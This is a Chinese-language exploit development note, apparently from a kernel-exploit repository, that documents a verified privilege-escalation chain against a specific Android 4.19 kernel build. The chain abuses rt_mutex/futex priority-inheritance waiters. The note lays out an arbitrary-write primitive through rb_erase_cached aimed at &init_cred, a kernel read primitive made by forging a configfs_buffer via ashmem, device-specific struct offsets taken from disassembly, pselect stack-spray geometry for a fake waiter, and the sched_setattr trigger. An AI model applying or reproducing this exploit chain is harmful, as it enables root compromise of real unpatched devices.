# 01 · 原语与关键偏移

本文只记录这台机器上**实机验证过**的部分。所有地址对应
`PD2118_A_9.5.3` + `4.19.152-perf+`；换固件必须重推。

## 写原语

`rb_erase_cached()` 删除 waiter 时的那一对 store：

```
ldr  x10, [x0]          ; pc     = node->__rb_parent_color
ands x8,  x10, #~3      ; parent = pc & ~3
...
str  x9,  [x8, #0x8]    ; parent->rb_right = child   -> *(X) = V
cbz  x9,  ...           ; child == 0 时短路
str  x10, [x9]          ; *(child) = pc              -> *(V) = X-8（附带写）
```

令 `node = waiter`、`parent = X-8`、`child = V`，得到两条约束：

- `*(X) = V`（主写）
- `*(V) = X-8`（附带写，关不掉；`V=0` 时被 `cbz` 短路）

所以「能写什么」取决于值的形态：

| 目标值 | 可行 | 代价 |
|---|---|---|
| `0` | 是 | 无附带写 |
| 内核地址（如 `&init_cred`） | 是 | 该地址前 8 字节被砸成 `X-8` |
| 普通数值 | 否 | `V` 被当指针解引用 |

## 读原语

`configfs_read_once()`：把 `ashmem` 的 name 伪造成一个 `configfs_buffer`，
其中 `page` 指向任意内核 VA，`needs_read_fill=0`，然后用 `pread` 把内容读出来。
不需要知道 KASLR 之外的额外信息。

## 与本机型有关的三个修正

这些是链从「走不通」变成「走通」的关键，都是从内核镜像反汇编得到的：

| 项 | 旧值 | 本仓库值 | 依据 |
|---|---|---|---|
| `task->pi_lock` | `0x8b4` | **`0x8d4`** | `rt_mutex_adjust_pi @0xd7c68: add x20,x0,#0x8d4` |
| `task->pi_waiters` | `0x8c0` | **`0x8e0`** | `adjust_prio_chain: [x19,#0x8e0]/[x19,#0x8e8]` |
| `task->pi_blocked_on` | `0x8d8` | **`0x8f8`** | `remove_waiter @0xd8d7c: str xzr,[x20,#0x8f8]` |
| `rt_mutex` | — | wait_lock@0 / waiters.rb_node@8 / leftmost@0x10 / owner@0x18 | `remove_waiter` 的 `ldr x22,[lock+0x10]` vs `ldr x24,[lock+0x18]` |
| `rt_mutex_waiter` (4.19) | — | tree@0 / pi_tree@0x18 / task@0x30 / lock@0x38 / prio@0x40 / deadline@0x48 | `task_blocks_on_rt_mutex @0xd89a4: stp x20,x19,[x21,#0x30]` |
| `struct futex_q`（vendor 多 0x10） | — | prio@0 / plist@8,0x10 / extra list@0x18,0x20 / task@0x28 / lock_ptr@0x30 / key@0x38 / pi_state@0x50 / rt_waiter@0x58 | `futex_wait_queue_me @0x13f8c8` 的初始化序列 |

## pselect 栈帧几何

两条 syscall 都从同一个 `el0_svc` 帧进来，只需算两个 syscall body：

```
__arm64_sys_futex     frame 0xc0
do_futex              stp x29,x30,[sp,#-0x60]! ; mov x29,sp
                      rt_waiter = x29 - 0xc8  ->  S - 0x1e8
__arm64_sys_pselect6  frame 0x80
core_sys_select       frame 0x1c0, stack_fds = sp + 0x50
                      nfds=320 -> FDS_BYTES=40 -> 5 words/set
                      -> stack_fds = S - 0x1f0
```

即 `rt_waiter == stack_fds + 8`：**伪造 waiter 必须落在全局 fd_set 第 1 个字**
（`PSELECT_WAITER_WORD_SHIFT = 1`），而不是第 0 个。

另一个坑：`pselect()` 必须阻塞在内核里，否则喷在 10–150 ms 后的触发到来前
就被后续 syscall 的栈帧覆盖。做法是把被置位的 fd 全部 dup 到空管道的**读端**
（合法但不可读），让 select 睡到超时。

## 触发链

`sched_setattr` 与 `sched_setscheduler` 在本机都会传 `pi=1` 给
`__sched_setscheduler`，再调 `rt_mutex_adjust_pi()`。
实测：改变 waiter 的 nice，owner 的 `prio` 严格跟随（20 → 39 → 25 → 20），
说明整条 `adjust_prio_chain()` 可用。

`GHOSTLOCK_TEST=chain` 是零风险自检：只改 nice、只读 `/proc`，不碰内核内存。
